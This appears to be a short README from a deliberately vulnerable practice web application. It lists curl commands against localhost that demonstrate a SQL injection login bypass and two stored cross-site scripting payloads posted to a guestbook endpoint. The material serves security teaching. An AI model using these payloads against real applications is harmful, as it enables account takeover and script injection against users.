A collection of curl commands you can use to exploit the vulnerabilities in the application.

## SQL injection

```bash
# Log in as any user
curl -X POST "http://localhost:8080/api/login" -H "Content-Type: application/json" -d "{\"username\": \"admin\", \"password\": \"' OR username='admin\"}" -v && echo ""
```

## Cross-site scripting

```bash
# Create a button that executed code when clicked
curl -X POST "http://localhost:8080/api/messages" -H "Content-Type: application/json" -d "{\"userId\": 1, \"message\": \"<button onclick=\\\"alert('pwned')\\\">Click me</button>\"}" -v && echo ""

# Execute a script when the guestbook page is loaded
curl -X POST "http://localhost:8080/api/messages" -H "Content-Type: application/json" -d "{\"userId\": 1, \"message\": \"<img onLoad=(alert('pwned')) src=\\\"./favicon.ico\\\" />\"}" -v && echo ""
```
